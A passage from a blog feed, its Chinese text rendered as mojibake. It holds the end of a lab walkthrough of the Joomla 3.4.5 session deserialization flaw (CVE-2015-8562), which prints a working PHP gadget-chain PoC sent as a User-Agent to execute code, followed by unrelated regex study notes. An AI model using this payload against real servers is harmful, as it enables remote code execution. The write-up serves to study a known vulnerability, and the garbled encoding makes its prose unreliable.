æ˜¯utf8ï¼Œå½“æˆ‘ä»¬æ’å…¥4å­—èŠ‚çš„utf8æ•°æ®æ—¶åˆ™ä¼šå¯¼è‡´æˆªæ–­ã€‚æˆªæ–­åçš„æ•°æ®åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šå¤±è´¥ï¼Œæœ€åè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</p><h4 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><ul><li>Joomla 1.5.x, 2.x, and 3.x before 3.4.6</li><li>PHP 5.6 &lt; 5.6.13, PHP 5.5 &lt; 5.5.29 and PHP 5.4 &lt; 5.4.45</li></ul><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>1.åœ¨ä½ç‰ˆæœ¬çš„phpä¸­,ååºåˆ—åŒ–å‡½æ•°unserializeåšäº†æ¬ ç¼ºçš„å¼‚å¸¸å¤„ç†ã€‚å³ä¸èƒ½æ­£ç¡®è§£æéœ€è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šæŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­çš„ä¸‹ä¸€ä¸ªæ ‡è¯†ç¬¦â€|â€,ä»æ­¤å¤„åˆ†å‰²ï¼Œä»¥æ ‡è¯†ç¬¦å‰æ®µåšæ®µåï¼Œå†æ¬¡è§£ææ ‡è¯†ç¬¦åæ®µçš„å­—ç¬¦ä¸²ï¼Œç›´åˆ°æˆåŠŸæˆ–è¿”å›ç©ºã€‚(æ­¤æ¼æ´ä¿®å¤ç‰ˆæœ¬ä¸º:4.5.45 5.5.29 5.6.13 7.x)</p><blockquote><p>åœ¨php5.6.13ä»¥å‰çš„ç‰ˆæœ¬é‡Œï¼Œphpåœ¨è·å–sessionå­—ç¬¦ä¸²ä»¥åï¼Œå°±å¼€å§‹æŸ¥æ‰¾ç¬¬ä¸€ä¸ª|ï¼Œç„¶åç”¨è¿™ä¸ª|å°†å­—ç¬¦ä¸²åˆ†å‰²æˆã€é”®åã€å’Œã€é”®å€¼ã€ã€‚<br>ç”¨unserializeè§£æé”®å€¼ï¼Œè§£æç»“æœä½œä¸ºsessionã€‚</p><p>ä½†å¦‚æœè¿™ä¸ªunserializeè§£æå¤±è´¥ï¼Œå°±æ”¾å¼ƒè¿™æ¬¡è§£æã€‚æ‰¾åˆ°ä¸‹ä¸€ä¸ª|ï¼Œå†æ ¹æ®è¿™ä¸ª|å°†å­—ç¬¦ä¸²åˆ†å‰²æˆä¸¤éƒ¨åˆ†ï¼Œæ‰§è¡ŒåŒæ ·çš„æ“ä½œï¼Œç›´åˆ°è§£ææˆåŠŸã€‚</p></blockquote><p>2.mysqlåœ¨ä½ç‰ˆæœ¬æˆ–æœªé…ç½®utf8mb4æ—¶å¤„ç†4å­—èŠ‚utfå­—ç¬¦ä¼šä»4å­—èŠ‚å¤„æˆªæ–­ï¼Œå³ä¸¢å¼ƒæˆªæ–­å¤„åçš„å­—ç¬¦ã€‚ï¼ˆåœ¨mysql 5.5.3ä»¥å å¯ä»¥é€šè¿‡è®¾ç½®å­—æ®µä¸ºutf8mb4æ¥é¿å…æ¼æ´ï¼‰</p><blockquote><p>åœ¨æˆ‘ä»¬æ„é€ å¥½çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²åé¢ï¼Œè¿˜æœ‰å®ƒåŸæœ¬çš„å†…å®¹ï¼Œå¿…é¡»è¦æˆªæ–­ã€‚è€Œæ­¤å¤„å¹¶ä¸åƒSQLæ³¨å…¥ï¼Œè¿˜æœ‰æ³¨é‡Šç¬¦å¯ç”¨ã€‚</p><p>åœ¨æ’å…¥æ•°æ®åº“çš„æ—¶å€™åˆ©ç”¨<code>ğŒ†</code>ï¼ˆ%F0%9D%8C%86ï¼‰å­—ç¬¦å°†utf-8çš„å­—æ®µæˆªæ–­äº†ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œåœ¨sessionè¿›å…¥æ•°æ®åº“çš„æ—¶å€™å°±æˆªæ–­åé¢çš„å†…å®¹ï¼Œé¿å…å¯¹æˆ‘ä»¬ååºåˆ—åŒ–è¿‡ç¨‹é€ æˆå½±å“ã€‚</p></blockquote><p>3.joomlaåœ¨å¯¹useragentå¤„ç†æ—¶ä¼šå°†useragentä½œä¸ºä¸€ä¸ªsessionå­˜å…¥æ•°æ®åº“ï¼Œæ²¡æœ‰è¿‡æ»¤å¼•èµ·phpååºåˆ—æ¼æ´çš„â€|â€ç¬¦å·ã€‚</p><blockquote><p>joomlaå¯¹sessionçš„å­˜å‚¨æ ¼å¼ä¸ºï¼š<code>é”®å + | + ç»serialize()åºåˆ—åŒ–å¤„ç†çš„å€¼</code></p><p>æ­¤å¤„æ¼æ´ä¸»è¦åˆ©ç”¨joomlaå­˜å‚¨æ ¼å¼å¯¹ | çš„å¤„ç†ä¸å½“ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ | ä¼ªé€ ï¼Œä½¿å¾— | å‰éƒ½ä¸ºnameï¼Œ | åå°±ä½œä¸ºæˆ‘ä»¬è¦æ’å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå³å¯æ„æˆååºåˆ—åŒ–æ¼æ´ã€‚</p></blockquote><p>è¿™ä¸ªjoomlaæ¼æ´çš„æ ¸å¿ƒå†…å®¹å°±æ˜¯ï¼šæˆ‘ä»¬é€šè¿‡<code>ğŒ†</code>å­—ç¬¦ï¼Œ å°†åŸæœ¬çš„sessionæˆªæ–­äº†ï¼Œç»“æœå› ä¸ºé•¿åº¦ä¸å¯¹æ‰€ä»¥ç¬¬ä¸€æ¬¡è§£æ|å¤±è´¥ï¼Œæ‰è½®åˆ°ç¬¬äºŒæ¬¡è§£æä¼ å…¥çš„ | ï¼Œæœ€åæˆåŠŸåˆ©ç”¨ã€‚</p><p>æ‰€ä»¥ï¼Œæ„é€ sessionå‡ºé”™ï¼Œæ˜¯è¿™ä¸ªæ¼æ´æˆç«‹çš„æ ¸å¿ƒã€‚</p><p><strong>æ•´ä¸ªæµç¨‹ï¼š</strong></p><p>ç¬¬ä¸€æ¬¡ä¼ åŒ…ï¼š</p><p>å®¢æˆ·ç«¯User-Agentå­—ç¬¦ä¸²-ã€‹joomlaå°†User-Agentå­—ç¬¦ä¸²å­˜å‚¨ä¸ºsession-ã€‹åˆå¹¶åˆ°sessionè¡¨ä¸­ï¼Œåºåˆ—åŒ–ï¼Œå°†å«pocçš„å­—ç¬¦ä¸²å­˜å…¥æ•°æ®åº“<strong>ï¼ˆmysqlæˆªæ–­æ¼æ´ï¼‰</strong></p><p>ç¬¬äºŒæ¬¡ä¼ åŒ…ï¼š</p><p>å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚-ã€‹ä»æ•°æ®åº“ä¸­è¯»å…¥æ•°æ®åº“å¹¶ååºåˆ—åŒ–session<strong>ï¼ˆphpååºåˆ—åŒ–æ¼æ´ï¼‰</strong>-ã€‹æ‰§è¡Œpocï¼Œé—­åˆå‡½æ•°</p><h3 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>ä¸å¸¦User-Agentå¤´ï¼Œå…ˆè®¿é—®ä¸€æ¬¡ç›®æ ‡ä¸»é¡µï¼Œè®°ä¸‹æœåŠ¡ç«¯è¿”å›çš„Cookieï¼š</p><p><img src="https://i.loli.net/2021/02/13/YvDAh5ro3GLyMQu.png"></p><p>vulhubæ–‡æ¡£æ»´pocï¼š            ï¼ˆåœ¨çº¿æ‰§è¡Œ<a href="https://sandbox.onlinephpfunctions.com/code/17e7080841ccce12f6c6e0bb1de01b9e390510bd">PHP Sandbox, test PHP online, PHP tester (onlinephpfunctions.com)</a>ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JSimplepieFactory</span> </span>&#123;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JDatabaseDriverMysql</span> </span>&#123;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SimplePie</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$sanitize</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cache</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cache_name_function</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$javascript</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$feed_url</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;feed_url = <span class="hljs-string">&quot;phpinfo();JFactory::getConfig();exit;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;javascript = <span class="hljs-number">9999</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;cache_name_function = <span class="hljs-string">&quot;assert&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;sanitize = <span class="hljs-keyword">new</span> JDatabaseDriverMysql();<br>        <span class="hljs-keyword">$this</span>-&gt;cache = <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JDatabaseDriverMysqli</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$disconnectHandlers</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$connection</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-keyword">new</span> JSimplepieFactory();<br>        <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> SimplePie();<br>        <span class="hljs-keyword">$this</span>-&gt;connection = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;disconnectHandlers = [<br>            [<span class="hljs-variable">$x</span>, <span class="hljs-string">&quot;init&quot;</span>],<br>        ];<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> JDatabaseDriverMysqli();<br><span class="hljs-variable">$poc</span> = serialize(<span class="hljs-variable">$a</span>); <br><br><span class="hljs-variable">$poc</span> = str_replace(<span class="hljs-string">&quot;\x00*\x00&quot;</span>, <span class="hljs-string">&#x27;\\0\\0\\0&#x27;</span>, <span class="hljs-variable">$poc</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;123&#125;__test|<span class="hljs-subst">&#123;$poc&#125;</span>\xF0\x9D\x8C\x86&quot;</span>;<br></code></pre></td></tr></table></figure><p>å°†ç”Ÿæˆå¥½çš„POCä½œä¸ºUser-Agentï¼Œå¸¦ä¸Šç¬¬ä¸€æ­¥è·å–çš„Cookieå‘åŒ…ï¼Œè¿™ä¸€æ¬¡å‘åŒ…ï¼Œè„<strong>æ•°æ®è¿›å…¥Mysqlæ•°æ®åº“</strong>ã€‚</p><p>ç„¶ååŒæ ·çš„åŒ…<strong>å†å‘ä¸€æ¬¡</strong>ï¼Œæˆ‘ä»¬çš„ä»£ç è¢«æ‰§è¡Œï¼š</p><p><img src="https://i.loli.net/2021/02/13/Lhlf4DN5pH7erMv.png"></p><p>å‚è€ƒ</p><p><a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html#session">Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰ | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/64017530">Joomla 3.4.5 ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-8562) åˆ†æ - çŸ¥ä¹ (zhihu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>é¶åœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>é¶åœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å­¦ä¹ æ­£åˆ™è¡¨è¾¾å¼çš„ä¸€äº›ç¬”è®°</title>
    <link href="/2021/02/05/%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/"/>
    <url>/2021/02/05/%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>emmmè™½ç„¶æ­£åˆ™è¡¨è¾¾å¼å¥½åƒä¸æ˜¯ç‰¹åˆ«æ€¥éœ€ï¼Œä½†åé¢è¿˜æ˜¯éœ€è¦å­¦çš„=-=ï¼Œå°±åœ¨åƒå–ç©ä¹ç¡çš„å‡æœŸæŠ½ç©ºå­¦ä¹ ä¸€ä¸‹ã€‚<br>æœ¬ç« æ˜¯é˜…è¯»ã€Šæ­£åˆ™è¡¨è¾¾å¼30åˆ†é’Ÿå…¥é—¨ã€‹çš„ç¬”è®°</p><h1 id="ç¬”è®°å’¯"><a href="#ç¬”è®°å’¯" class="headerlink" title="ç¬”è®°å’¯"></a>ç¬”è®°å’¯</h1><h2 id="å…ƒå­—ç¬¦"><a href="#å…ƒå­—ç¬¦" class="headerlink" title="å…ƒå­—ç¬¦"></a>å…ƒå­—ç¬¦</h2><p><code>.</code> ï¼šåŒ¹é…é™¤æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦<br><code>\w</code>ï¼šåŒ¹é…å­—æ¯æˆ–æ•°å­—æˆ–ä¸‹åˆ’çº¿æˆ–æ±‰å­—ç­‰<br><code>\s</code>ï¼šåŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦(Tab)ï¼Œæ¢è¡Œç¬¦ï¼Œä¸­æ–‡å…¨è§’ç©ºæ ¼ ç­‰<br><code>\d</code>ï¼šåŒ¹é…ä¸€ä½æ•°å­—<br><code>\b</code>ï¼šåŒ¹é…å•è¯çš„å¼€å§‹æˆ–ç»“æŸã€‚åŒ¹é…è¿™æ ·ä¸€ä¸ªä½ç½®ï¼šå®ƒçš„å‰ä¸€ä¸ªå­—ç¬¦å’Œåä¸€ä¸ªå­—ç¬¦ä¸å…¨æ˜¯\wï¼ˆä¸€ä¸ªæ˜¯ï¼Œä¸€ä¸ªä¸æ˜¯æˆ–ä¸å­˜åœ¨ï¼‰<br><code>^</code>ï¼šåŒ¹é…å­—ç¬¦ä¸²å¼€å§‹<br><code>$</code>ï¼šåŒ¹é…å­—ç¬¦ä¸²ç»“æŸ<br><code>(</code>å’Œ<code>)</code>ï¼šå°æ‹¬å·æœ‰å¾ˆå¤šå¦™ç”¨ï¼Œçœ‹ä¸‹é¢å§</p><h2 id="ç•Œå®šç¬¦"><a href="#ç•Œå®šç¬¦" class="headerlink" title="ç•Œå®šç¬¦"></a>ç•Œå®šç¬¦</h2><p>æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸï¼Œå¯ä»¥å½“æˆæ˜¯è®¡ç®—æœºè¯­è¨€ä¸­çš„å¤§æ‹¬å·<code>&#123;</code>å’Œ<code>&#125;</code>ã€‚ä¸€èˆ¬æœ‰ä¸‰ç§è¡¨ç°æ–¹å¼ï¼š</p><ul><li>æ–œæ ã€‚ä¾‹å¦‚<code>/[0-9]/</code>ã€‚è¿™æ˜¯æœ€å¸¸ç”¨çš„æ–¹å¼ï¼Œåœ¨PHPä¸­ï¼Œæ¨èä½¿ç”¨è¿™ç§æ–¹å¼ã€‚</li><li>äº•å·ã€‚ä¾‹å¦‚<code>#[0-9]</code>ã€‚</li><li>å¤§æ‹¬å·ã€‚ä¾‹å¦‚<code>&#123;[0-9]&#125;</code>ã€‚åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œå¤§æ‹¬å·è¿˜æœ‰å…¶ä»–ä½œç”¨ï¼Œæ‰€ä»¥è¿™ç§æ–¹å¼ä¸æ¨èä½¿ç”¨ã€‚</li></ul><h2 id="åä¹‰"><a href="#åä¹‰" class="headerlink" title="åä¹‰"></a>åä¹‰</h2><p><code>\W</code> åŒ¹é…ä»»æ„ä¸æ˜¯å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ï¼Œæ±‰å­—çš„å­—ç¬¦<br><code>\S</code> åŒ¹é…ä»»æ„ä¸æ˜¯ç©ºç™½ç¬¦çš„å­—ç¬¦<br><code>\D</code> åŒ¹é…ä»»æ„éæ•°å­—çš„å­—ç¬¦<br><code>\B</code> åŒ¹é…ä¸æ˜¯å•è¯å¼€å¤´æˆ–ç»“æŸçš„ä½ç½®<br><code>[\^x]</code> åŒ¹é…é™¤äº†xä»¥å¤–çš„ä»»æ„å­—ç¬¦<br><code>[\^aeiou]</code> åŒ¹é…é™¤äº†aeiouè¿™å‡ ä¸ªå­—æ¯ä»¥å¤–çš„ä»»æ„å­—ç¬¦</p><h2 id="å­—ç¬¦è½¬ä¹‰"><a href="#å­—ç¬¦è½¬ä¹‰" class="headerlink" title="å­—ç¬¦è½¬ä¹‰"></a>å­—ç¬¦è½¬ä¹‰</h2><p>è‹¥éœ€è¦æŸ¥æ‰¾å…ƒå­—ç¬¦æœ¬èº«å¦‚<code>.</code>ã€<code>*</code>è¿™äº›ï¼Œéœ€è¦ç”¨<code>\</code>æ¥å°†è¿™äº›å­—ç¬¦çš„ç‰¹æ®Šæ„ä¹‰å–æ¶ˆæ‰ï¼šå¦‚<code>\.</code>ã€<code>\*</code>ï¼›å½“ç„¶æŸ¥æ‰¾<code>\</code>æœ¬èº«ä¹Ÿéœ€è¦è½¬ä¹‰ä¸º<code>\\</code></p><h2 id="é‡è¯"><a href="#é‡è¯" class="headerlink" title="é‡è¯"></a>é‡è¯</h2><p><code>*</code> ï¼šä»»æ„æ•°é‡ï¼›é‡å¤0æ¬¡æˆ–å¾ˆå¤šæ¬¡<br><code>+</code>ï¼š&gt;=1æ¬¡ï¼›é‡å¤1æ¬¡æˆ–å¾ˆå¤šæ¬¡<br><code>?</code>ï¼š0 or 1ï¼›é‡å¤0æ¬¡æˆ–1æ¬¡<br><code>&#123;n&#125;</code>ï¼šnæ¬¡ï¼›å¦‚ï¼š\d{2}ï¼ˆè¡¨ç¤º\dé‡å¤åŒ¹é…2æ¬¡ï¼‰ï¼›<br><code>&#123;n,&#125;</code>ï¼š&gt;=næ¬¡ï¼›é‡å¤næ¬¡æˆ–æ›´å¤šæ¬¡<br><code>&#123;n,m&#125;</code>ï¼šé‡å¤nåˆ°mæ¬¡ï¼›é‡å¤æ¬¡æ•°ä¸å°‘äºnï¼Œä¸å¤§äºm</p><h2 id="æŸ¥æ‰¾å­—ç¬¦ç±»"><a href="#æŸ¥æ‰¾å­—ç¬¦ç±»" class="headerlink" title="æŸ¥æ‰¾å­—ç¬¦ç±»"></a>æŸ¥æ‰¾å­—ç¬¦ç±»</h2><p>å¦‚æŸ¥æ‰¾abcdeï¼Œåªéœ€åœ¨æ–¹æ‹¬å·ä¸­åˆ—å‡º<code>[abcde]</code>;é‚£ä¹ˆå°±æ„é€ äº†è¿™æ ·ä¸€ä¸ªåªä¼šåŒ¹é…abcdeçš„å­—ç¬¦é›†ï¼Œæ•°é‡ç”±å…¶åçš„é‡å¤æ¬¡æ•°å†³å®š</p><p>ä¹Ÿå¯ä»¥æŒ‡å®šèŒƒå›´ï¼š<br>[0-9] ä»£è¡¨çš„å«æ„ä¸ \d å°±æ˜¯å®Œå…¨ä¸€è‡´çš„ï¼šä¸€ä½ æ•°å­—ï¼›<br>[a-z0-9A-Z_] ä¹Ÿå®Œå…¨ç­‰åŒäº \w ï¼ˆå¦‚æœåªè€ƒè™‘è‹±æ–‡çš„è¯ï¼‰ã€‚</p><h2 id="åˆ†æ”¯æ¡ä»¶"><a href="#åˆ†æ”¯æ¡ä»¶" class="headerlink" title="åˆ†æ”¯æ¡ä»¶"></a>åˆ†æ”¯æ¡ä»¶</h2><p>æ­£åˆ™è¡¨è¾¾å¼é‡Œçš„åˆ†ææ¡ä»¶æŒ‡çš„æ˜¯æœ‰å‡ ç§è§„åˆ™ï¼Œå¦‚æœæ»¡è¶³å…¶ä¸­ä»»æ„ä¸€ç§è§„åˆ™éƒ½ä¼šè¿›è¡ŒåŒ¹é…ï¼Œå…·ä½“æ–¹æ³•æ˜¯ç”¨ <code>|</code> æŠŠä¸åŒçš„è§„åˆ™åˆ†éš”å¼€ã€‚å¦‚a | bï¼Œåªè¦æ»¡è¶³å…¶ä¸­ä¹‹ä¸€ï¼Œéƒ½ä¼šè¿›è¡ŒåŒ¹é…</p><h2 id="åˆ†ç»„-å­è¡¨è¾¾å¼"><a href="#åˆ†ç»„-å­è¡¨è¾¾å¼" class="headerlink" title="åˆ†ç»„(å­è¡¨è¾¾å¼)"></a>åˆ†ç»„(å­è¡¨è¾¾å¼)</h2><p>æƒ³è¦é‡å¤å¤šä¸ªå­—ç¬¦æ—¶ï¼Œéœ€è¦å…ˆç”¨å°æ‹¬å·è¿›è¡Œåˆ†ç»„ï¼Œç„¶åå†æŒ‡å®šè¿™ä¸ªåˆ†ç»„çš„é‡å¤æ¬¡æ•°ã€‚<br>egï¼š<br><code>(\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;</code><br>æ˜¯ä¸€ä¸ªç®€å•çš„ IP åœ°å€åŒ¹é…è¡¨è¾¾å¼ã€‚<br>æŒ‰ä¸‹åˆ—é¡ºåºåˆ†æå®ƒï¼š<br><code>\d&#123;1,3&#125;</code>åŒ¹é… 1åˆ°3ä½çš„æ•°å­—ï¼Œ<br> <code>(\d&#123;1,3&#125;\.)&#123;3&#125; </code>åŒ¹é…ä¸‰ä½æ•°å­—åŠ ä¸Šä¸€ä¸ªè‹±æ–‡å¥å·(è¿™ä¸ªæ•´ä½“ä¹Ÿå°±æ˜¯è¿™ä¸ªåˆ†ç»„) é‡å¤3æ¬¡ï¼Œ<br>æœ€åå†åŠ ä¸Šä¸€ä¸ªä¸€åˆ°ä¸‰ä½çš„æ•°å­— <code>(\d&#123;1,3&#125;)</code> ã€‚</p><p>IPåœ°å€ä¸­æ¯ä¸ªæ•°å­—éƒ½ä¸èƒ½å¤§äº255 ä¸” 01.02.03.04 è¿™æ ·å‰é¢å¸¦æœ‰0çš„æ•°å­—, ä¹Ÿæ˜¯æ­£ç¡®çš„IPåœ°å€ï¼ŒIP åœ°å€é‡Œçš„æ•°å­—å¯ä»¥åŒ…å«æœ‰å‰å¯¼ 0 (leading zeroes).<br>ä¸è¿‡ä¸Šè¿°æ­£åˆ™è¡¨è¾¾å¼ä¹Ÿä¼šåŒ¹é… 256.300.888.999 è¿™ç§ä¸å¯èƒ½å­˜åœ¨çš„IPåœ°å€ã€‚<br>å¦‚æœèƒ½ä½¿ç”¨ç®—æœ¯æ¯”è¾ƒçš„è¯ï¼Œæˆ–è®¸èƒ½ç®€å•åœ°è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯æ­£åˆ™è¡¨è¾¾å¼ä¸­å¹¶ä¸æä¾›å…³äºæ•°å­¦çš„ä»»ä½•åŠŸèƒ½<br>æ‰€ä»¥åªèƒ½ä½¿ç”¨å†—é•¿çš„åˆ†ç»„ï¼Œé€‰æ‹©ï¼Œå­—ç¬¦ç±»æ¥æè¿°ä¸€ä¸ªæ­£ç¡®çš„IPåœ°å€ï¼š<br><code>((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)</code></p><p>ç†è§£è¿™ä¸ªè¡¨è¾¾å¼çš„å…³é”®æ˜¯ç†è§£ <code>2[0-4]\d|25[0-5]|[01]?\d\d?</code></p><p>è§£æï¼šåˆ†æˆä¸‰éƒ¨åˆ†ï¼š<code>2[0-4]\d</code>ã€<code>25[0-5]</code>ã€<code>[01]?\d\d?</code><br><code>2[0-4]\d</code>ï¼š<strong>2</strong> + <strong>[0-4]ä¸­çš„ä»»ä¸€ä¸ª</strong> + <strong>ä»»æ„æ•°å­—</strong>ï¼›å³ï¼š200-209ã€210-219ã€220-229ã€230-239ã€240-249<br><code>25[0-5]ï¼š</code>ï¼š<strong>25</strong> + <strong>[0-5]ä»»ä¸€ä¸ª</strong>ï¼›å³ï¼š250-255<br><code>[01]?\d\d?ï¼š</code>ï¼š**[01]?**  +  <strong>\d</strong>  +  <strong>\d?</strong>;å³0/1(ä¸åŒ¹é…æˆ–åŒ¹é…1æ¬¡)ï¼ŒåŠ ä¸Šä»»ä¸€æ•°å­—ï¼ŒåŠ ä¸Šä»»ä¸€æ•°å­—(ä¸åŒ¹é…æˆ–åŒ¹é…1æ¬¡)</p><h2 id="åå‘å¼•ç”¨"><a href="#åå‘å¼•ç”¨" class="headerlink" title="åå‘å¼•ç”¨"></a>åå‘å¼•ç”¨</h2><p>ä½¿ç”¨å°æ‹¬å·æŒ‡å®šä¸€ä¸ªå­è¡¨è¾¾å¼åï¼ŒåŒ¹é…è¿™ä¸ªå­è¡¨è¾¾å¼çš„æ–‡æœ¬(ä¹Ÿå°±æ˜¯æ­¤åˆ†ç»„æ•è·çš„å†…å®¹)å¯ä»¥åœ¨è¡¨è¾¾å¼æˆ–å…¶å®ƒç¨‹åºä¸­ä½œè¿›ä¸€æ­¥çš„å¤„ç†ã€‚<br>ä¹Ÿå°±æ˜¯è¯´å¯ä»¥å¯¹åˆ†ç»„åŒ¹é…åˆ°çš„æ–‡å­—è¿›è¡Œå¤„ç†</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåˆ†ç»„ä¼šè‡ªåŠ¨æ‹¥æœ‰ä¸€ä¸ªç»„å·ï¼Œè§„åˆ™æ˜¯ï¼šä»å·¦å‘å³ï¼Œä»¥åˆ†ç»„çš„å·¦æ‹¬å·ä¸ºæ ‡å¿—ï¼Œç¬¬ä¸€ä¸ªå‡ºç°çš„åˆ†ç»„çš„ç»„å·ä¸º1ï¼Œç¬¬äºŒä¸ªä¸º2ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p>åå‘å¼•ç”¨ç”¨äºé‡å¤æœç´¢å‰é¢æŸä¸ªåˆ†ç»„åŒ¹é…çš„æ–‡æœ¬ã€‚<br>ä¾‹å¦‚ï¼š<br> <code>\1</code> ä»£è¡¨åˆ†ç»„1åŒ¹é…çš„æ–‡æœ¬ã€‚<br>ç¤ºä¾‹ï¼š <code>\b(\w+)\b\s+\1\b</code>  å°±å¯ä»¥å¯ä»¥ç”¨æ¥åŒ¹é…é‡å¤çš„å•è¯ï¼Œåƒgo go, æˆ–è€…kitty kittyã€‚</p><p>è§£æï¼š<br><code>(\b(\w+)\b)</code> :é¦–å…ˆæ˜¯ä¸€ä¸ªå•è¯ï¼ˆè¿™ä¸ªå•è¯ä¼šè¢«æ•è·åˆ°ç¼–å·ä¸º1çš„åˆ†ç»„ä¸­ï¼‰ï¼Œä¹Ÿå°±æ˜¯å•è¯å¼€å§‹å¤„å’Œç»“æŸå¤„ä¹‹é—´æ•°é‡å¤šäºä¸€ä¸ªçš„å­—æ¯æˆ–æ•°å­—<br><code>(\s+)</code> ï¼šç„¶åæ˜¯1ä¸ªæˆ–å‡ ä¸ªç©ºç™½ç¬¦<br> <code>(\1)</code> ï¼šæœ€åæ˜¯åˆ†ç»„1ä¸­æ•è·çš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯å‰é¢åŒ¹é…çš„é‚£ä¸ªå•è¯ï¼‰</p><h3 id="è‡ªå®šä¹‰å­è¡¨è¾¾å¼çš„ç»„å"><a 